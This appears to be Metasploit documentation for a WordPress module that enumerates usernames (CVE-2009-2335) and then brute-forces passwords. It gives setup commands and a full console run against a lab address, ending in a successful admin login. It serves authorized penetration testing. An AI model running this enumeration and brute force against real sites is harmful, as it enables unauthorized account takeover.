## Descriptions

This auxiliary module will brute-force a WordPress installation and first determine valid usernames and then perform a password-guessing attack. WordPress and WordPress MU before 2.8.1 exhibit different behavior for a failed login attempt depending on whether the user account exists, which allows remote attackers to enumerate valid usernames. NOTE: The vendor reportedly disputes the significance of this issue, indicating that the behavior exists for "user convenience." More infomation can be found in [CVE-2009-2335](https://www.cvedetails.com/cve/cve-2009-2335).

## Verification Steps

1. Do: ```use auxiliary/scanner/http/wordpress_login_enum```
2. Do: ```set URI [URI]```
3. Do: ```set PASS_FILE [password file]```
4. Do: ```set USER_FILE [username list file]```
5. Do: ```set RHOSTS [IP]```
6. Do: ```run```

## Scenarios

```
msf > use auxiliary/scanner/http/wordpress_login_enum
msf auxiliary(wordpress_login_enum) > set URI /wordpress/wp-login.php
URI => /wordpress/wp-login.php
msf auxiliary(wordpress_login_enum) > set PASS_FILE /tmp/passes.txt
PASS_FILE => /tmp/passes.txt
msf auxiliary(wordpress_login_enum) > set USER_FILE /tmp/users.txt
USER_FILE => /tmp/users.txt
msf auxiliary(wordpress_login_enum) > set RHOSTS 192.168.1.201
RHOSTS => 192.168.1.201
msf auxiliary(wordpress_login_enum) > run

[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Running User Enumeration
[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Checking Username:'administrator'
[-] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Invalid Username: 'administrator'
[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Checking Username:'admin'
[+] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration- Username: 'admin' - is VALID
[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Checking Username:'root'
[-] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Invalid Username: 'root'
[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Checking Username:'god'
[-] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Invalid Username: 'god'
[+] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Found 1 valid user
[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Running Bruteforce
[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Skipping all but 1 valid user
[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Trying username:'admin' with password:''
[-] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Failed to login as 'admin'
[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Trying username:'admin' with password:'root'
[-] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Failed to login as 'admin'
[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Trying username:'admin' with password:'admin'
[-] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Failed to login as 'admin'
[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Trying username:'admin' with password:'god'
[-] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Failed to login as 'admin'
[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Trying username:'admin' with password:'s3cr3t'
[+] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - SUCCESSFUL login for 'admin' : 's3cr3t'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(wordpress_login_enum) >
```
